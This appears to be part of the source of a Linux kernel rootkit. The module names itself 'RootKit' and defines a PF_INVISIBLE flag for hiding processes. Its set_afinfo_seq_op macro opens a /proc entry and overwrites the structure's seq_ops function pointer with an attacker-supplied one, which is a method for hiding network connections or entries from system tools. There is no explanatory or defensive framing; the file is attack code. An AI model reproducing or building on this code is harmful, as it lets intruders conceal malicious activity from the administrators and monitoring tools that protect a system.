#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
extern struct module __this_module;

#define fm_alert(fmt, ...) 						\
	fm_printk(KERN_ALERT, fmt, ##__VA_ARGS__)

#define fn_printk(level, fmt, ...) 				\
	printk(level "%s: " fmt, __func__, ##__VA_ARGS__)

#define fm_printk(level, fmt, ...) 				\
	printk(level "%s.%s: " fmt, THIS_MODULE->name, __func__, ##__VA_ARGS__)

#define fn_alert(fmt, ...) 						\
	fn_printk(KERN_ALERT, fmt, ##__VA_ARGS__)
#define PF_INVISIBLE 0x10000000

#define MODULE_NAME "RootKit"

#define set_afinfo_seq_op(op, path, afinfo_struct, new, old) \
	do { 													\
		struct file *filp; 									\
		afinfo_struct *afinfo; 								\
		filp = filp_open(path, O_RDONLY, 0); 				\
		if (IS_ERR(filp)) { 								\
			fm_alert("Failed to open %s with error %ld\n", 	\
							path, PTR_ERR(filp)); 			\
			old = NULL; 									\
		} else { 											\
			afinfo = PDE_DATA(filp->f_path.dentry->d_inode);\
			old = afinfo->seq_ops.op; 						\
			fm_alert("Setting seq_op->" #op "from %p to %p\n",\
							old, new); 						\
			afinfo->seq_ops.op = new; 						\
			filp_close(filp, 0); 							\
		} 													\
	} while(0) 
